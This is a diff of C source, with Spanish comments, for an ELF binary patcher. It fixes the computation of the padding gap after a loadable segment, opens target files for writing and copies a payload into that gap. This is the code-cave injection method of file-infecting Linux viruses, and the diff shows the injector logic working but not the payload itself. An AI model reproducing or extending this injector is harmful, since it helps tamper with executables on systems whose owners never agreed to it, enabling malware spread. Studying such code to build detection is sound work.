@@ -200,8 +200,8 @@ int patch_file(void *map, size_t size) {
     for (Elf64_Half i = 0; i < ehdr->e_phnum; i++) {
         Elf64_Phdr* phdr = &phtab[i];
         if (phdr->p_type == PT_LOAD) {
-            size_t aligned_size = ALIGN(phdr->p_filesz - phdr->p_offset, phdr->p_align);
-            size_t actual_size = phdr->p_filesz - phdr->p_offset;
+            size_t aligned_size = ALIGN(phdr->p_offset + phdr->p_filesz, phdr->p_align) - phdr->p_offset;
+            size_t actual_size = phdr->p_filesz;
             if (aligned_size - actual_size > sizeof(payload)) {
                 injectable_phdr = phdr;
                 break;
@@ -210,12 +210,18 @@ int patch_file(void *map, size_t size) {
     }
 
     if (!injectable_phdr) {
-        // proceder añadiendo una nueva seccion y toda la pesca (llorar)
+        // proceder añadiendo una nueva seccion y toda la pesca (llorar) -> O se lo dejo a Tomatin ! jaja
         return 0;
     }
 
+    /* Print line into binary */
+    uint8_t *offset = (uint8_t *)map + injectable_phdr->p_offset + injectable_phdr->p_filesz;
+    if (offset > (uint8_t*)map + size) {
+        // También nos vamos a la inyeccion de nueva seccion.
+        return 0;
+    }
+    memcpy(offset, payload, sizeof(payload));
     return 0;
-
 }
 
 void process_file(char* filename) {
@@ -225,7 +231,7 @@ void process_file(char* filename) {
     void* map = MAP_FAILED;
     int ret;
 
-    if ((fd = open(filename, O_RDONLY | O_NONBLOCK)) == -1) {
+    if ((fd = open(filename, O_RDWR | O_NONBLOCK)) == -1) {
         LOG_ERRNO();
         goto cleanup;
     }
@@ -233,7 +239,7 @@ void process_file(char* filename) {
         LOG_ERRNO();
         goto cleanup;
     }
-    /* Read first 4 bytes of file to check if it is ELF: */
+    /* Read first 4 bytes of file to check if it is ELF */
     {
         char magic[SELFMAG];
         ssize_t n = read(fd, magic, SELFMAG);
